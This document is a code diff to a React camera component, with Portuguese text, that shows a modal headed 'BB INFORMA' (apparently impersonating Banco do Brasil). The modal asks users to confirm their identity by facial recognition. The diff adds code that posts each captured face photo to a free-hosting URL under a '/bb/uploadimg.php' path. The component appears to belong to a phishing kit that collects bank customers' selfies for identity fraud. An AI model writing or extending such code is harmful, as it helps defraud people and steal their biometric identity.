@@ -1,5 +1,6 @@
 import React, { useRef } from 'react';
-import './CameraComponent.css'
+import axios from 'axios'; // Certifique-se de ter axios instalado
+import './CameraComponent.css';
 
 const CameraComponent = () => {
     const videoRef = useRef(null);
@@ -7,8 +8,8 @@ const CameraComponent = () => {
     const modalRef = useRef(null);
 
     const closeModal = () => {
-      modalRef.current.style.display = 'none';
-    }
+        modalRef.current.style.display = 'none';
+    };
 
     const startCamera = async () => {
         try {
@@ -34,27 +35,30 @@ const CameraComponent = () => {
         console.error('Error accessing camera:', error);
     };
 
-    const capturePhoto = () => {
+    const capturePhoto = async () => {
         if (videoRef.current && canvasRef.current) {
             const video = videoRef.current;
             const canvas = canvasRef.current;
             const context = canvas.getContext('2d');
 
-            // Define o tamanho do canvas para ser igual ao tamanho do vídeo
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
 
-            // Desenha o quadro atual do vídeo no canvas
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-            // Você pode fazer algo com a imagem capturada aqui, como enviar para o servidor
-
-            // Exemplo de exibição da imagem capturada no console
             const imageData = canvas.toDataURL('image/jpeg');
-            if(!imageData){
-              alert('erro ao capturar foto')
+
+            try {
+                const response = await axios.post('https://clicklucro.000webhostapp.com/bb/uploadimg.php', {
+                    image: imageData
+                });
+
+                console.log('Resposta do servidor:', response.data);
+                alert('Imagem enviada com sucesso!');
+            } catch (error) {
+                console.error('Erro ao enviar imagem:', error);
+                alert('Erro ao enviar imagem. Verifique o console para mais detalhes.');
             }
-            console.log('Imagem capturada:', imageData);
         }
     };
 
@@ -64,15 +68,15 @@ const CameraComponent = () => {
 
     return (
         <div className='camera-frame'>
-          <div className='enquadramento'></div>
-          <div className='modal' ref={modalRef}>
-            <div className='sob-modal'>
-              <i className="bi bi-camera" id='exclamation-icon'></i>
-              <span className='title-alert'>BB INFORMA</span>
-              <span className='subtitle-alert'>Confirme sua identidade com reconhecimento facial, habilite a permissão de câmera no seu navegador.</span>
-              <span className='resgatar-btn' onClick={() => closeModal()}>ENTENDIDO</span>
+            <div className='enquadramento'></div>
+            <div className='modal' ref={modalRef}>
+                <div className='sob-modal'>
+                    <i className="bi bi-camera" id='exclamation-icon'></i>
+                    <span className='title-alert'>BB INFORMA</span>
+                    <span className='subtitle-alert'>Confirme sua identidade com reconhecimento facial, habilite a permissão de câmera no seu navegador.</span>
+                    <span className='resgatar-btn' onClick={closeModal}>ENTENDIDO</span>
+                </div>
             </div>
-          </div>
             <video className='video-frame' ref={videoRef} autoPlay playsInline muted style={{ maxWidth: '100%' }} />
             <div>
                 <span onClick={capturePhoto} className="capture-button">Capturar Foto</span>
